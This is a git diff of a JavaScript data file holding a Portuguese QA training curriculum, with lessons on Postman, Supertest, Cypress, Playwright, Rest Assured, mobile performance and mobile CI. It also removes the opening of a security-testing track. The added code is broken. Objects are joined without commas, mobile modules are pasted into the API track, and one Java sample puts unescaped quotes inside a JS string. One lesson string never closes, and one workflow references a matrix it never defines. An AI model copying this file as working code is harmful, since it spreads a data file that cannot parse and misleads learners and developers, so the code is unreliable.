@@ -1,5 +1,5 @@
 window.TG_QAWAY_TRACKS = [
-{
+  {
     id: "starter",
     slug: "guild-initiation",
     title: "Iniciação da Guilda",
@@ -175,7 +175,7 @@ const [usuario, produtos, carrinho] = await Promise.all([
       }
     ]
   },
-{
+  {
     id: "web",
     slug: "frontend-forge",
     title: "Forja Frontend",
@@ -413,7 +413,7 @@ cy.criarUsuario('admin').then((usuario) => {
       ]}
     ]
   },
-{
+  {
     id: "api",
     slug: "integration-workshop",
     title: "Oficina de Integração",
@@ -431,7 +431,7 @@ cy.criarUsuario('admin').then((usuario) => {
         { id: "a1-l3", title: "OpenAPI/Swagger", duration: "40 min", content: "<p>OpenAPI e Swagger transformam a API em uma documentação viva e testável. Em vez de depender apenas de um documento escrito à mão, o time consegue usar o contrato como referência para desenvolvimento, testes e validação de integração.</p><h3>Por que isso ajuda o QA</h3><ul><li>Mostra os endpoints, métodos e payloads esperados</li><li>Ajuda a identificar campos obrigatórios e formatos</li><li>Facilita a criação de testes manuais e automatizados</li><li>Reduz mal-entendidos entre backend, frontend e QA</li></ul><h3>O que observar</h3><ul><li>Campos obrigatórios e opcionais</li><li>Tipos de dados e limites</li><li>Exemplos de request e response</li><li>Códigos de erro esperados</li></ul><h3>Exemplo prático</h3><p>Se a especificação define que um campo de e-mail é obrigatório, o QA deve validar tanto o fluxo feliz quanto os cenários em que ele está ausente ou em formato inválido. Isso reduz retrabalho e melhora a comunicação com o time.</p><blockquote><strong>Guild Master:</strong> Um contrato bem definido não elimina bugs, mas reduz muito a chance de interpretar mal o comportamento da API.</blockquote><h3>Perguntas de revisão</h3><ul><li>Como o contrato de API ajuda a planejar testes?</li><li>Que tipo de informação um QA deve procurar no Swagger?</li><li>Como um contrato desatualizado pode gerar falso positivo em teste?</li></ul><h3>Resumo prático</h3><p>Ao concluir esta aula, você deve conseguir usar um contrato de API como base para testar com mais clareza e menos suposição.</p>", resources: [{ label: "OpenAPI Spec", url: "https://swagger.io/specification/" }] }
       ]},
         },
-{
+  {
     id: "mobile",
     slug: "mobile-lab",
     title: "Laboratório Mobile",
@@ -475,8 +475,258 @@ cy.criarUsuario('admin').then((usuario) => {
         { id: "m8-l1", title: "Automatizar app demo", duration: "90 min", content: "<p>Use app de demo (ApiDemos, WDIO native demo). 5 fluxos automatizados + README.</p>", resources: [{ label: "Appium Sample Apps", url: "https://github.com/appium/appium/tree/master/packages/appium/sample-code" }] }
       ]}
     ]
+  }{ id: "a2", title: "Postman Profissional", lessons: [
+        { id: "a2-l1", title: "Collections e environments", duration: "40 min", content: "<p>Collections e environments são a base de um trabalho profissional com APIs em ferramentas como Postman. Eles deixam o fluxo de teste organizado, reutilizável e mais fácil de manter quando o time cresce.</p><h3>Collections</h3><p>Uma collection agrupa requests relacionados, como auth, usuários, pedidos ou pagamentos. Isso ajuda a organizar cenários de teste por contexto e por funcionalidade.</p><h3>Environments</h3><p>Environments permitem alternar entre ambientes sem mudar manualmente cada request. Exemplo: base URL diferente para dev, staging e produção, além de variáveis como token, usuário e versão do app.</p><h3>Exemplo prático</h3><p>Em vez de copiar a URL em cada request, o QA pode usar uma variável como <strong>{{baseUrl}}</strong> e trocar o valor conforme o ambiente. Isso reduz erro humano e acelera a execução de testes.</p><blockquote><strong>Guild Master:</strong> Dados bem organizados fazem a diferença entre testes repetíveis e testes que dependem da memória do QA.</blockquote><h3>Perguntas de revisão</h3><ul><li>Por que collections ajudam na organização de testes?</li><li>Como um environment melhora a execução entre diferentes ambientes?</li><li>Que tipo de variável você usaria em um fluxo de login?</li></ul><h3>Resumo prático</h3><p>Ao concluir esta aula, você deve conseguir montar uma estrutura simples e profissional para testar APIs com mais consistência.</p>", resources: [{ label: "Postman Learning", url: "https://learning.postman.com/" }] },
+        { id: "a2-l2", title: "Tests tab e Newman CLI", duration: "45 min", content: "<p>A aba Tests no Postman transforma uma request comum em uma validação automatizada. Em vez de olhar manualmente a resposta, o QA pode deixar o próprio tool verificar status code, corpo, headers e tempo de resposta.</p><h3>O que você pode validar</h3><ul><li>Status code esperado</li><li>Campos obrigatórios no body</li><li>Valores específicos de resposta</li><li>Tempo de resposta e comportamento de erro</li></ul><h3>Newman</h3><p>Newman é a versão de linha de comando do Postman. Ele permite rodar collections em CI, em pipelines e em ambientes headless, o que é essencial para integrar testes de API no fluxo de entrega.</p><h3>Exemplo prático</h3><p>Uma coleção de autenticação pode validar que um login com credenciais válidas retorna 200, enquanto um login inválido retorna 401. Com Newman, isso roda automaticamente em cada mudança de código.</p><blockquote><strong>Guild Master:</strong> Quando o teste de API roda sozinho em cada pipeline, a equipe ganha confiança sem depender de validação manual no final.</blockquote><h3>Perguntas de revisão</h3><ul><li>Por que usar assertions em requests de API?</li><li>Qual a vantagem de rodar collections via Newman?</li><li>Como você usaria isso para proteger uma release?</li></ul><h3>Resumo prático</h3><p>Ao concluir esta aula, você deve conseguir transformar requests em testes automatizados e integrá-los em um fluxo de CI com mais segurança.</p>", resources: [] },
+        { id: "a2-l3", title: "Mock servers e monitoramento", duration: "35 min", content: "<p>Mock servers são muito úteis quando o backend ainda não está pronto ou quando você quer isolar o frontend de dependências externas. Eles permitem testar o comportamento esperado da aplicação antes da integração completa existir.</p><h3>Quando usar mock server</h3><ul><li>Frontend precisa de uma API para continuar evoluindo</li><li>O time quer testar cenários de erro sem depender de um serviço real</li><li>É necessário simular latência, falhas e respostas diferentes</li></ul><h3>Monitoramento</h3><p>Já em ambiente real, QA também precisa acompanhar o comportamento das APIs em produção. Monitoramento ajuda a identificar quedas, respostas lentas, erros recorrentes e mudanças que impactam usuários.</p><h3>Exemplo prático</h3><p>Um QA pode usar um mock para validar a tela de checkout em desenvolvimento e, depois, repetir o teste com o backend real para garantir que o contrato continua correto.</p><blockquote><strong>Guild Master:</strong> O melhor mock não é o que imita tudo — é o que ajuda o time a testar o que importa com rapidez.</blockquote><h3>Perguntas de revisão</h3><ul><li>Quando um mock server entrega mais valor do que um backend real?</li><li>Qual a diferença entre testar com mock e testar com serviço real?</li><li>Como monitoramento ajuda a detectar problemas que não aparecem em testes locais?</li></ul><h3>Resumo prático</h3><p>Ao concluir esta aula, você deve conseguir escolher entre mock e ambiente real com mais critério e entender o papel do monitoramento na garantia de qualidade.</p>", resources: [] }
+      ]},
+      { id: "a3", title: "Automação API com JavaScript", lessons: [
+        { id: "a3-l1", title: "fetch e axios", duration: "40 min", content: "<p>Em JavaScript, o QA precisa entender o básico de requisições de rede porque automação e testes de interface frequentemente dependem de APIs. O principal ponto é saber quando usar fetch, quando usar axios e como lidar com falhas de forma previsível.</p><h3>fetch</h3><p>Fetch é a API nativa do navegador e do Node. É simples, mas exige mais cuidado para tratar erros e headers. Excelente para cenários pequenos e para quem quer usar o que já vem com a linguagem.</p><h3>axios</h3><p>Axios é uma biblioteca popular porque traz uma sintaxe mais prática, suporte a interceptors, timeout e tratamento consistente. Em projetos maiores, isso costuma reduzir boilerplate e deixar o código mais legível.</p><h3>O que observar em testes</h3><ul><li>Timeout e retry</li><li>Headers e autenticação</li><li>Erros de rede e status inesperados</li><li>Respostas com payloads incompletos</li></ul><h3>Exemplo prático</h3><p>Se uma chamada de login demora demais, o QA deve verificar se a aplicação mostra feedback claro, tenta novamente ou bloqueia o fluxo com uma mensagem útil. Isso é tão importante quanto validar se o endpoint respondeu 200.</p><blockquote><strong>Guild Master:</strong> Uma API pode estar tecnicamente correta e ainda assim oferecer uma experiência ruim se não tratar falha com clareza.</blockquote><h3>Perguntas de revisão</h3><ul><li>Quando fetch é suficiente e quando axios traz mais valor?</li><li>Por que timeout e retry merecem atenção em testes?</li><li>Como você validaria a experiência do usuário quando a API falha?</li></ul><h3>Resumo prático</h3><p>Ao concluir esta aula, você deve conseguir comparar abordagens de requisição HTTP e identificar cenários de teste que envolvem comportamento de rede e tratamento de erro.</p>", resources: [] },
+        { id: "a3-l2", title: "Supertest + Jest/Mocha", duration: "50 min", content: "<p>Supertest\ é\ uma\ forma\ prática\ de\ testar\ APIs\ no\ backend\ com\ JavaScript\.\ Ele\ permite\ validar\ endpoints\ reais\ com\ uma\ sintaxe\ simples\ e\ combinar\ essa\ validação\ com\ Jest\ ou\ Mocha\ em\ uma\ suíte\ objetiva\.</p><h3>Por\ que\ usar</h3><ul><li>Testa\ rotas\ diretamente</li><li>Ajuda\ a\ validar\ regras\ de\ negócio</li><li>Fica\ mais\ rápido\ do\ que\ abrir\ a\ UI\ para\ cada\ cenário</li><li>Facilita\ a\ cobertura\ de\ sucesso\ e\ falha</li></ul><h3>Exemplo\ prático</h3><p>Um\ teste\ pode\ verificar\ que\ um\ cadastro\ com\ dados\ válidos\ retorna\ 201,\ enquanto\ outro\ valida\ que\ campos\ obrigatórios\ ausentes\ retornam\ 400\ com\ mensagem\ apropriada\.\ Esse\ tipo\ de\ checagem\ pega\ regressões\ cedo\.</p><blockquote><strong>Guild\ Master:</strong>\ Testes\ de\ API\ não\ substituem\ testes\ de\ interface,\ mas\ frequentemente\ encontram\ falhas\ antes\ que\ o\ usuário\ as\ veja\.</blockquote><h3>Perguntas\ de\ revisão</h3><ul><li>Qual\ a\ vantagem\ de\ testar\ o\ endpoint\ diretamente\?</li><li>Como\ você\ estruturaria\ cenários\ de\ sucesso\ e\ erro\?</li><li>Por\ que\ combinar\ Supertest\ com\ Jest\ ou\ Mocha\ é\ uma\ prática\ sólida\?</li></ul><h3>Resumo\ prático</h3><p>Ao\ concluir\ esta\ aula,\ você\ deve\ conseguir\ criar\ testes\ de\ API\ automatizados\ em\ JavaScript\ para\ validar\ comportamento\ e\ regras\ de\ negócio\ com\ mais\ confiança\.</p>", resources: [{ label: "Supertest", url: "https://github.com/ladjs/supertest" }] }
+      ]},
+      { id: "a4", title: "Cypress e Playwright API", lessons: [
+        { id: "a4-l1", title: "cy.request no Cypress", duration: "40 min", content: "<p>O Cypress permite testar APIs diretamente com <strong>cy.request</strong>, o que é muito útil para criar dados de teste, validar integrações e preparar cenários antes de rodar uma suíte E2E completa. Essa abordagem deixa o fluxo mais rápido e mais previsível.</p><h3>Quando usar</h3><ul><li>Para setup de dados antes do teste UI</li><li>Para validar endpoints sem depender da interface</li><li>Para testar cenários de erro e autenticação com mais precisão</li></ul><h3>Vantagens práticas</h3><p>Usar API requests no Cypress reduz tempo de execução, evita dependência de telas intermediárias e ajuda o QA a isolar falhas: a interface ou a API?</p><h3>Exemplo prático</h3><p>Antes de testar um fluxo de checkout, o QA pode criar um usuário e um carrinho via API, então abrir a tela e validar o comportamento da interface com dados já preparados. Isso torna o teste mais estável e menos frágil.</p><blockquote><strong>Guild Master:</strong> Quando a automação usa API para preparar o estado, a suíte passa a refletir melhor o que importa ao usuário.</blockquote><h3>Perguntas de revisão</h3><ul><li>Quando usar request em vez de interação manual na UI?</li><li>Como isso melhora a confiabilidade de um teste E2E?</li><li>Quais casos de teste ganham mais com esse tipo de setup?</li></ul><h3>Resumo prático</h3><p>Ao concluir esta aula, você deve conseguir usar chamadas de API dentro de testes Cypress para preparar ambientes, validar integrações e reduzir fragilidade.</p>", resources: [] },
+        { id: "a4-l2", title: "Playwright request context", duration: "40 min", content: "<p>O <strong>APIRequestContext</strong> do Playwright permite criar uma camada de testes de API dentro do mesmo projeto de automação. Isso é especialmente útil quando o QA precisa combinar setup via API com validação de UI em um único fluxo, sem depender de ferramentas separadas.</p><h3>Vantagens</h3><ul><li>Cria dados com mais rapidez</li><li>Evita duplicação de lógica entre test suites</li><li>Pode validar CRUD completo antes ou durante o teste de interface</li><li>Facilita o uso de autenticação e headers em cenários reais</li></ul><h3>Exemplo prático</h3><p>Um teste pode criar um pedido via API, abrir a tela do pedido no navegador e verificar se o estado é exibido corretamente. Isso ajuda a testar integração entre frontend e backend de forma muito mais realista.</p><blockquote><strong>Guild Master:</strong> Quando API e UI vivem no mesmo fluxo, a automação fica mais próxima da realidade do usuário.</blockquote><h3>Perguntas de revisão</h3><ul><li>Como o request context melhora a organização de testes?</li><li>Quando vale combinar testes de API e UI no mesmo cenário?</li><li>Que risco você evita ao não depender só da interface para criar estado?</li></ul><h3>Resumo prático</h3><p>Ao concluir esta aula, você deve conseguir usar o request context do Playwright para montar cenários mais completos, rápidos e alinhados com o comportamento real do sistema.</p>", resources: [] }
+      ]},
+      { id: "a5", title: "Rest Assured (Java)", lessons: [
+        { id: "a5-l1", title: "Given-When-Then com Rest Assured", duration: "55 min", content: "<p>Rest Assured é uma biblioteca Java para testar APIs REST de forma fluida e legível. O ponto mais importante para QA é entender que a mesma API pode ser validada em diferentes camadas: unit, integration, contract.</p><h3>Por que isso importa</h3><ul><li>Testes de API em Java sem boilerplate</li><li>DSL fluida: given().when().then()</li><li>Validação de status, body, headers, schema</li><li>Integração nativa com JUnit/TestNG</li></ul><h3>Exemplo completo</h3><pre><code>// Dependencies (Maven)
+<dependency>
+    <groupId>io.rest-assured</groupId>
+    <artifactId>rest-assured</artifactId>
+    <version>5.4.0</version>
+    <scope>test</scope>
+</dependency>
+<dependency>
+    <groupId>org.hamcrest</groupId>
+    <artifactId>hamcrest</artifactId>
+    <version>2.2</version>
+    <scope>test</scope>
+</dependency>
+
+// Test class
+@Test
+void deveCriarUsuarioComSucesso() {
+    given()
+        .contentType(ContentType.JSON)
+        .body("{"name": "John", "email": "john@test.com"}")
+    .when()
+        .post("/api/users")
+    .then()
+        .statusCode(201)
+        .body("id", notNullValue())
+        .body("name", equalTo("John"))
+        .body("email", equalTo("john@test.com"));
+
+// Schema validation
+@Test
+void deveValidarSchemaResposta() {
+    given()
+        .get("/api/users/1")
+    .then()
+        .statusCode(200)
+        .body(matchesJsonSchemaInClasspath("schemas/user.json"));
+}</code></pre><h3>Dicas para QA</h3><ul><li>Use <code>RequestSpecification</code> e <code>ResponseSpecification</code> para reutilizar config comum</li><li>Valide schema JSON para pegar regressões de contrato</li><li>Combine com WireMock para testes de contract isolados</li><li>Rest Assured + Pact = Consumer Driven Contracts em Java</li></ul><h3>Perguntas de revisão</h3><ul><li>Como Rest Assured ajuda a reduzir flakiness em testes de API?</li><li>Qual a diferença entre validar campo a campo vs schema validation?</li><li>Como integrar Rest Assured no pipeline CI/CD?</li></ul><h3>Resumo prático</h3><p>Ao concluir esta aula, você deve conseguir escrever testes de API em Java com Rest Assured, validar schemas e integrar no pipeline de CI.
+</p>, resources: [] }
+      ]},
+      { id: "m6", title: "Performance e Battery Mobile", lessons: [
+        { id: "m6-l1", title: "Métricas mobile", duration: "35 min", content: "<p>Startup time, memory leaks, ANR, crash rate. Firebase Crashlytics.
+</p><h3>Métricas essenciais de performance mobile</h3><table style="width:100%;border-collapse:collapse;margin:1rem 0"><tr style="background:rgba(0,229,255,0.1)"><th style="padding:0.5rem;border:1px solid var(--border)">Métrica</th><th style="padding:0.5rem;border:1px solid var(--border)">Definição</th><th style="padding:0.5rem;border:1px solid var(--border)">Target típico</th></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>App Startup Time</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Tempo do lançamento até UI interativa</td><td style="padding:0.5rem;border:1px solid var(--border)">< 2s (cold), < 500ms (warm)</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Memory Usage</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Heap, RSS, GC pauses, OOM kills</td><td style="padding:0.5rem;border:1px solid var(--border)">< 150MB (Android), < 200MB (iOS)</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>ANR (Application Not Responding)</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">UI thread bloqueado > 5s</td><td style="padding:0.5rem;border:1px solid var(--border)">0 ANRs</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Crash Rate</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">% de sessões com crash</td><td style="padding:0.5rem;border:1px solid var(--border)">< 0.1%</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Frame Rendering (Jank)</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Frames > 16ms (60fps) ou > 8ms (120fps)</td><td style="padding:0.5rem;border:1px solid var(--border)">0% jank</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Battery Drain</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Consumo anômalo de bateria</td><td style="padding:0.5rem;border:1px solid var(--border)">Dentro do top 25% da categoria</td></tr></table><h3>Ferramentas de monitoramento</h3><ul><li><strong>Firebase Crashlytics:</strong> crashes, non-fatal, ANRs, logs automáticos</li><li><strong>Android Vitals / Play Console:</strong> ANR rate, crash rate, startup time, stuck partial wake locks</li><li><strong>Xcode Metrics / App Store Connect:</strong> crash rate, memory, CPU, disk writes</li><li><strong>Perfetto / Systrace / Android Studio Profiler:</strong> traces detalhados</li></ul><h3>Como medir startup time</h3><pre><code># Android: adb shell am start -W com.exemplo/.MainActivity
+# Output inclui:
+# ThisTime: 1245    (tempo total cold start)
+# WaitTime: 1250
+
+# Para medir programaticamente (Appium)
+const startTime = Date.now();
+await driver.activateApp('com.exemplo.app');
+const launchTime = Date.now() - startTime;
+console.log(`Startup: ${launchTime}ms`);</code></pre><h3>Memory leaks — como detectar</h3><ul><li><strong>Android:</strong> <code>adb shell dumpsys meminfo com.exemplo.app</code> — procure por "Leaked" ou crescimento contínuo</li><li><strong>iOS:</strong> Xcode → Debug Memory Graph → procura por objetos que não deveriam estar vivos</li><li><strong>Automatizado:</strong> rode suite de testes em loop 10x, meça memória antes/depois</li></ul><h3>Firebase Crashlytics — setup básico</h3><pre><code>// Android (build.gradle)
+dependencies {
+    implementation 'com.google.firebase:firebase-crashlytics:18.4.0'
+    implementation 'com.google.firebase:firebase-analytics:21.3.0'
+}
+
+// iOS (Podfile)
+pod 'FirebaseCrashlytics'
+pod 'FirebaseAnalytics'
+
+// Log customizado
+FirebaseCrashlytics.getInstance().log("Usuário abriu checkout");
+FirebaseCrashlytics.getInstance().setCustomKey("user_id", "12345");
+try {
+    // código arriscado
+} catch (e) {
+    FirebaseCrashlytics.getInstance().recordException(e);
+}</code></pre><h3>Exercício prático</h3><ol><li>Configure Crashlytics em um app demo</li><li>Force um crash: <code>throw new RuntimeException("Test crash")</code></li><li>Veja o crash no console Firebase</li><li>Adicione logs customizados e chaves personalizadas</li></ol>", resources: [] }
+      ]},
+      { id: "m7", title: "CI/CD Mobile", lessons: [
+        { id: "m7-l1", title: "Pipeline com emulador headless", duration: "50 min", content: "<p>GitHub Actions + Android emulator. Upload APK, roda Appium, artefatos de screenshot.
+</p><h3>GitHub Actions — Mobile CI completo</h3><pre><code># .github/workflows/mobile.yml
+name: Mobile Tests
+
+on: [push, pull_request]
+
+jobs:
+  android-tests:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    
+    strategy:
+      fail-fast: false
+      matrix:
+        avd: [pixel_7_api_33, pixel_6_api_33]  # 2 emuladores paralelos
+    
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Setup Node
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+          cache: 'npm'
+      
+      - name: Cache node_modules
+        uses: actions/cache@v4
+        with:
+          path: ~/.npm
+          key: npm-${{ hashFiles('package-lock.json') }}
+      
+      - run: npm ci
+      
+      - name: Start Android Emulator
+        uses: reactivecircus/android-emulator-runner@v2
+        with:
+          api-level: 33
+          target: google_apis
+          arch: x86_64
+          avd-name: ${{ matrix.avd }}
+          emulator-options: -no-window -no-audio -no-boot-anim -gpu swiftshader_indirect
+          force-avd-creation: false
+      
+      - name: Run WDIO Tests
+        run: npx wdio run wdio.conf.js
+        env:
+          APPIUM_SERVER_URL: http://localhost:4723
+      
+      - name: Upload Screenshots
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: screenshots-${{ matrix.avd }}
+          path: screenshots/
+          retention-days: 7
+      
+      - name: Upload Allure Results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: allure-results-${{ matrix.avd }}
+          path: allure-results/
+          retention-days: 7</code></pre><h3>Configuração avançada — com build step</h3><pre><code>name: E2E Tests
+
+on: [push, pull_request]
+
+jobs:
+  e2e:
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Setup Node
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+          cache: 'npm'
+      
+      - name: Install dependencies
+        run: npm ci
+      
+      - name: Build application
+        run: npm run build
+      
+      - name: Start Android Emulator
+        uses: reactivecircus/android-emulator-runner@v2
+        with:
+          api-level: 33
+          target: google_apis
+          arch: x86_64
+          avd-name: pixel_7
+          emulator-options: -no-window -no-audio -no-boot-anim -gpu swiftshader_indirect
+          force-avd-creation: false
+      
+      - name: Run WDIO Tests
+        run: npx wdio run wdio.conf.js
+        env:
+          APPIUM_SERVER_URL: http://localhost:4723
+      
+      - name: Upload Screenshots
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: screenshots-${{ matrix.avd }}
+          path: screenshots/
+          retention-days: 7</code></pre><h3>Paralelização inteligente</h3><pre><code>strategy:
+  fail-fast: false
+  matrix:
+    shardIndex: [1, 2, 3, 4]
+    shardTotal: [4]
+    # ou para múltiplos browsers/OS
+    os: [ubuntu-latest, windows-latest, macos-latest]
+    browser: [chromium, firefox, webkit]</code></pre><h3>Playwright em container</h3><pre><code># .github/workflows/playwright.yml
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with: { node-version: 20, cache: 'npm' }
+      - run: npm ci
+      - run: npx playwright install chromium --with-deps
+      - name: Start app and run E2E
+        run: npx playwright test --shard=${{ matrix.shardIndex }}/${{ matrix.shardTotal }}
+        env:
+          APPIUM_SERVER_URL: http://localhost:4723</code></pre><h3>Exercício prático</h3><ol><li>Crie <code>.github/workflows/mobile.yml</code> com pipeline completa</li><li>Configure paralelização em 2 emuladores</li><li>Adicione upload de artefatos (screenshots, Allure</li><li>Teste: force um fail intencional (adicione <code>sleep(100)</code> no código) — o gate deve bloquear</li></ol>", resources: [] }
+      ]},
+      { id: "m8", title: "Projeto Final Mobile", lessons: [
+        { id: "m8-l1", title: "Automatizar app demo", duration: "90 min", content: "<p>Use app de demo (ApiDemos, WDIO native demo). 5 fluxos automatizados + README.
+</p><h3>A aplicação</h3><p>Recomendamos <strong>Sauce Demo (Swag Labs)</strong> — e-commerce fictício público com:</p><ul><li><strong>URL:</strong> <a href="https://www.saucedemo.com/" target="_blank">saucedemo.com</a> (versão web mobile responsiva)</li><li><strong>App nativo Android:</strong> <a href="https://github.com/saucelabs/sample-app-mobile" target="_blank">saucelabs/sample-app-mobile</a></li><li><strong>Credenciais:</strong> <code>standard_user</code> / <code>secret_sauce</code></li><li><strong>Usuários extras:</strong> locked_out_user, problem_user, performance_glitch_user</li></ul><h3>Escopo do projeto</h3><p>Crie uma suite completa cobrindo:</p><h4>1. Autenticação</h4><ul><li>Login válido (standard_user)</li><li>Login bloqueado (locked_out_user)</li><li>Credenciais inválidas</li><li>Logout</li></ul><h4>2. Catálogo</h4><ul><li>Listagem de produtos</li><li>Filtro/ordenação (A-Z, Z-A, preço)</li><li>Detalhe do produto</li></ul><h4>3. Carrinho</h4><ul><li>Adicionar/remover itens</li><li>Badge do carrinho</li><li>Persistência entre navegação</li></ul><h4>4. Checkout</h4><ul><li>Informações do cliente (first name, last name, zip)</li><li>Validação de campos obrigatórios</li><li>Overview do pedido</li><li>Finalização</li></ul><h3>Estrutura do projeto</h3><pre><code>swag-mobile-tests/
+├── tests/
+│   ├── smoke/              # 5-10 testes críticos, < 3 min
+│   │   └── critical-paths.smoke.spec.js
+│   └── e2e/                # Suite completa de regressão
+│       ├── auth.spec.js
+│       ├── catalog.spec.js
+│       ├── cart.spec.js
+│       └── checkout.spec.js
+├── pageobjects/
+│   ├── base/
+│   │   └── BaseScreen.js
+│   ├── common/
+│   │   ├── LoginScreen.js
+│   │   ├── ProductsScreen.js
+│   │   ├── CartScreen.js
+│   │   └── CheckoutScreen.js
+│   └── android/
+│       └── AndroidHomeScreen.js
+├── fixtures/
+│   ├── users.json
+│   └── products.json
+├── .github/workflows/
+│   └── mobile.yml
+├── wdio.conf.js
+├── package.json
+└── README.md</code></pre><h3>Checklist de qualidade</h3><h4>✅ Testes</h4><ul><li>Todos passam em 3+ execuções consecutivas (estabilidade)</li><li>Independentes — ordem de execução não importa</li><li>Assertions específicas (<code>expect(x).toBe(y)</code>, não <code>toBeTruthy()</code>)</li><li>Waits explícitos onde necessário, zero <code>sleep()</code> hardcoded</li><li>Cenários negativos incluídos (não só happy path)</li></ul><h4>✅ Organização</h4><ul><li>Page Object Model implementado corretamente (seletores centralizados)</li><li>Estrutura de pastas clara (<code>tests/</code>, <code>pageobjects/</code>, <code>fixtures/</code>)</li><li>Nomenclatura consistente (camelCase para JS, kebab-case para arquivos)</li><li>Código sem duplicação excessiva (DRY)</li><li>Comentários onde a lógica não é óbvia</li></ul><h4>✅ Segurança</h4><ul><li><code>.gitignore</code> correto:
+<pre>node_modules/
+test-results/
+allure-results/
+.env
+*.log</pre>
+</li><li>Zero credenciais no código — use variáveis de ambiente ou fixtures públicas</li><li>Nenhum token, API key ou informação sensível commitada</li></ul><h3>Checklist de documentação</h3><h4>✅ README.md obrigatório</h4><p>Deve conter no mínimo:</p><ul><li><strong>Título e descrição</strong> do projeto</li><li><strong>Tecnologias utilizadas</strong> (WDIO, Appium, Node.js, etc)</li><li><strong>Como instalar:</strong> <code>npm install</code>, <code>appium driver install uiautomator2</code></li><li><strong>Como rodar:</strong> <code>npm test</code>, <code>npm run test:headed</code></li><li><strong>Como rodar em CI:</strong> link para workflow GitHub Actions</li><li><strong>Badges de status</strong> (build passing, coverage, etc)</li></ul><h3>Entrega</h3><p>Ao concluir, você terá:</p><ul><li>Repositório GitHub público com CI/CD verde</li><li>Suite rodando em <strong>paralelo</strong> (mínimo 2 devices)</li><li>Relatório Allure publicado automaticamente</li><li>README profissional documentando tudo</li><li>Base sólida para seu portfólio de QA Mobile</li></ul><p><strong>Boa automação!</strong> 🚀</p>", resources: [{ label: "Appium Sample Apps", url: "https://github.com/appium/appium/tree/master/packages/appium/sample-code" }] }
+      ]}
+    ]
   },
-{
+  {
     id: "performance",
     slug: "load-arena",
     title: "Arena de Carga",
@@ -1811,402 +2061,7 @@ HTTP/1.1 200 OK
       ]}
     ]
   },
-{
-    id: "security",
-    slug: "security-sentinel",
-    title: "Sentinela de Segurança",
-    icon: "🛡️",
-    color: "#6366f1",
-    description: "Aprenda testes de segurança, OWASP Top 10 e técnicas para encontrar vulnerabilidades antes dos atacantes.",
-    modules: 6,
-    hours: 36,
-    level: "Intermediário",
-    topics: ["OWASP", "Pentest básico", "ZAP/Burp", "SQLi/XSS", "Auth testing", "Security CI"],
-    courses: [
-      { id: "sec1", title: "Fundamentos de Security Testing", lessons: [
-        { id: "sec1-l1", title: "QA vs Security Engineer", duration: "30 min", content: "<p>QA foca em funcionalidade e experiência; Security Testing foca em proteção de ativos, confidencialidade, integridade, disponibilidade. Mindset: "como quebro isso?"</p><h3>Diferenças fundamentais</h3><table style="width:100%;border-collapse:collapse;margin:1rem 0"><tr style="background:rgba(0,229,255,0.1)"><th style="padding:0.5rem;border:1px solid var(--border)">Aspecto</th><th style="padding:0.5rem;border:1px solid var(--border)">QA Funcional</th><th style="padding:0.5rem;border:1px solid var(--border)">Security Testing</th></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Objetivo</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Validar que funciona como especificado</td><td style="padding:0.5rem;border:1px solid var(--border)">Encontrar falhas que permitem abuso</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Mindset</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">"Funciona?" (happy path + edge cases)</td><td style="padding:0.5rem;border:1px solid var(--border)">"Como quebro?" (adversarial thinking)</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Escopo</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Requisitos funcionais, UX, performance</td><td style="padding:0.5rem;border:1px solid var(--border)">CIA triad: Confidencialidade, Integridade, Disponibilidade</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Dados de teste</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Válidos, inválidos, boundary</td><td style="padding:0.5rem;border:1px solid var(--border)">Maliciosos, payloads, fuzzing, encoding</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Sucesso</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Todos testes passam</td><td style="padding:0.5rem;border:1px solid var(--border)">Vulnerabilidades encontradas e reportadas</td></tr><tr><td style="padding:0.5rem;border:1px solid var(--border)"><strong>Ferramentas</strong></td><td style="padding:0.5rem;border:1px solid var(--border)">Playwright, Cypress, Postman, JMeter</td><td style="padding:0.5rem;border:1px solid var(--border)">Burp, ZAP, sqlmap, nuclei, bandit, semgrep</td></tr></table><h3>CIA Triad — base do Security Testing</h3><ul><li><strong>Confidencialidade (Confidentiality):</strong> só quem deve ver, vê. Ex: dados sensíveis não vazam em logs, APIs, UI.</li><li><strong>Integridade (Integrity):</strong> dados não são alterados indevidamente. Ex: IDOR, parameter tampering, injection.</li><li><strong>Disponibilidade (Availability):</strong> sistema acessível quando necessário. Ex: DoS, resource exhaustion, ransomware.</li></ul><h3>OWASP Top 10 2021 — checklist mental</h3><ol><li><strong>A01: Broken Access Control</strong> — IDOR, path traversal, missing auth checks</li><li><strong>A02: Cryptographic Failures</strong> — dados sensíveis em claro, algoritmos fracos</li><li><strong>A03: Injection</strong> — SQLi, NoSQLi, command injection, 